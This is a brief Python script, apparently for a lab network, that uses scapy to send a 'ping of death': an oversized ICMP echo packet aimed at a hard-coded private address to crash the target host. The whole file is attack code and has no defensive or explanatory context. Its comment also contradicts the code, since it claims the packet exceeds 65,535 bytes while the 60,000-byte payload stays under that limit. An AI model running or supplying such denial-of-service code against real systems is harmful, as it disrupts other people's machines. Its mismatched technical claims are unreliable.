from scapy.all import send
from scapy.layers.inet import IP, ICMP


def ping_of_death(target_ip):
    # Create an oversized ICMP Echo Request packet
    # The size exceeds the standard limit (the total size will be more than 65,535 bytes)
    ip = IP(dst=target_ip)
    icmp = ICMP()
    payload = b"A" * 60000  # Creating a large payload (over 60,000 bytes)
    
    pkt = ip / icmp / payload
    send(pkt)


target_ip = "192.168.56.1"

ping_of_death(target_ip)
